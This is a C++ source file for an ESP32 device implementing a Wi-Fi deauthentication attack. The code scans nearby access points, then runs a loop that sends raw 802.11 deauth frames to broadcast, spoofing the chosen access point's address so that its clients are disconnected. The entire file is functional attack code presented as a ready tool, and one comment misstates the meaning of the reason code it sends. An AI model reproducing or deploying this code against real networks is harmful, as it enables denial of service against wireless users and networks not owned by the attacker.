#include "WifiDeauth.h"
#include <WiFi.h>
#include <esp_wifi.h>

bool WifiDeauth::scan() {
    _apList.clear();
    WiFi.mode(WIFI_STA);

    int n = WiFi.scanNetworks(false, true); // blocking, include hidden
    if (n < 0) return false;

    for (int i = 0; i < n; i++) {
        ApInfo info;
        info.ssid    = WiFi.SSID(i);
        info.rssi    = WiFi.RSSI(i);
        info.channel = WiFi.channel(i);
        uint8_t* b   = WiFi.BSSID(i);
        if (b) memcpy(info.bssid, b, 6);
        _apList.push_back(info);
    }

    WiFi.scanDelete();
    Serial.printf("[WifiDeauth] scan found %d APs\n", (int)_apList.size());
    return true;
}

bool WifiDeauth::startDeauth(int apIndex) {
    if (_running) return false;
    if (apIndex < 0 || apIndex >= (int)_apList.size()) return false;

    _targetIndex = apIndex;
    _targetSsid  = _apList[apIndex].ssid;

    esp_wifi_set_channel((uint8_t)_apList[apIndex].channel, WIFI_SECOND_CHAN_NONE);

    _running = true;
    BaseType_t ok = xTaskCreatePinnedToCore(
        deauthTask, "wifi_deauth", 4096, this, 1, &_taskHandle, 0
    );

    if (ok != pdPASS) {
        _running = false;
        return false;
    }

    Serial.println("[WifiDeauth] deauth started: " + _targetSsid);
    return true;
}

void WifiDeauth::stop() {
    if (!_running) return;
    _running = false;
    delay(200);
    _taskHandle = nullptr;
    Serial.println("[WifiDeauth] stopped");
}

bool WifiDeauth::isRunning() const {
    return _running;
}

const std::vector<ApInfo>& WifiDeauth::getApList() const {
    return _apList;
}

const String& WifiDeauth::getTargetSsid() const {
    return _targetSsid;
}

const char* WifiDeauth::rssiLabel(int32_t rssi) {
    if (rssi >= -60) return "****";
    if (rssi >= -70) return "*** ";
    if (rssi >= -80) return "**  ";
    return "*   ";
}

void WifiDeauth::deauthTask(void* pvParam) {
    static_cast<WifiDeauth*>(pvParam)->runLoop();
    vTaskDelete(nullptr);
}

void WifiDeauth::runLoop() {
    while (_running) {
        if (_targetIndex >= 0 && _targetIndex < (int)_apList.size()) {
            for (int i = 0; i < 10 && _running; i++) {
                sendDeauthFrame(
                    _apList[_targetIndex].bssid,
                    (uint8_t)_apList[_targetIndex].channel
                );
                vTaskDelay(pdMS_TO_TICKS(10));
            }
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

void WifiDeauth::sendDeauthFrame(const uint8_t bssid[6], uint8_t channel) {
    (void)channel; // channel was set once in startDeauth

    uint8_t frame[26];
    memset(frame, 0, sizeof(frame));

    frame[0] = 0xC0; frame[1] = 0x00;          // Frame Control: deauth
    frame[2] = 0x00; frame[3] = 0x00;          // Duration
    for (int i = 0; i < 6; i++) frame[4+i] = 0xFF; // DA: broadcast
    memcpy(frame + 10, bssid, 6);               // SA: spoofed as AP
    memcpy(frame + 16, bssid, 6);               // BSSID
    frame[22] = 0x00; frame[23] = 0x00;         // Sequence
    frame[24] = 0x07; frame[25] = 0x00;         // Reason: leaving BSS

    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}
